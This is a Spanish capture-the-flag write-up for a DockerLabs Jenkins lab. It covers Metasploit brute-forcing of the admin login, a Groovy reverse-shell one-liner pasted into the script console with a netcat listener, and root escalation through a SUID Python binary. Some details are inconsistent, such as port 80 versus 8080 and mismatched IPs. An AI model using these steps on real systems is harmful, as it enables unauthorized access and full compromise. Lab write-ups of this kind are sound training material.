# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/f0527158-e221-41b3-8967-b3869d37af11)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

3. **8080/tcp(HTTP):** Jetty 10.0.20

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador y su puerto correspondiente. Encontramos un inicio de sesión de Jenkins.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/40477dcb-055c-4cb1-8205-c7e899ca4305)

# Fase 2- Exploración

#### Feroxbuster
No encontró nada muy interesante.

# Fase 3- Explotación

#### Jenkins
Jenkins viene con un usuario por defecto, que es el usuario  `admin`, así que vamos a realizarle fuerza bruta a ese usuario. Para esto vamos a usar Metasploit.
```python
msf6 > search jenkins
19  auxiliary/scanner/http/jenkins_login
msf6 > use 19
msf6 auxiliary(scanner/http/jenkins_login) > show options
msf6 auxiliary(scanner/http/jenkins_login) > set RPORT 8080
RPORT => 8080
msf6 auxiliary(scanner/http/jenkins_login) > set RHOSTS 172.17.0.2
RHOSTS => 172.17.0.2
msf6 auxiliary(scanner/http/jenkins_login) > set USERNAME admin
USERNAME => admin
msf6 auxiliary(scanner/http/jenkins_login) > set PASS_FILE /usr/share/wordlists/rockyou.txt
PASS_FILE => /usr/share/wordlists/rockyou.txt
msf6 auxiliary(scanner/http/jenkins_login) > run
[+] 172.17.0.2:8080 - Login Successful: admin:rockyou
```
Y nos encontró la contraseña del usuario `admin` que es `rockyou`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/1c42b86e-847a-4d39-9995-42a392f89f34)
Y efectivamente, estamos dentro!

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2240076d-f95f-4b92-a250-72036f3e3537)

Vamos a `Administrar jenkins`, bajamos y nos encontramos con la `consola de scripts`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e56d12b0-f327-4ee7-9965-f11bbcd1a3a6)
En la consola se usa Groovy script, que es un lenguaje parecido a java, en la consola pegamos el siguiente codigo que es una reverse shell:
```java
String host="ip";int port=port;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
Nos ponemos en escucha con el siguiente comando: `nc -nlvp 443`.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/495011ba-fe47-4017-aa29-8e8c82d5ce77)
Y estamos dentro!.

# Fase 4- Privilegios

#### Sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/aceacab8-ad27-4399-812f-a29e4c2fe37f)

Despues de realizar el tratamiento de la TTY, con el comando `find / -perm -4000 -user root 2>/dev/null` encontramos que podemos ejecutar `python3.10` como usuario `root`.

#### Python3.10
Gtfobins nos dice que para escalar utilizando python, tenemos que ejecutar lo siguiente:
```python
sudo python -c 'import os; os.system("/bin/sh")'
```
Como esto no me funciono, lo modifique de la siguiente forma:
```python
/usr/bin/python3.10 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/dda23b3b-2afc-4b59-89d5-862b12439d5f)

Y somos root!.
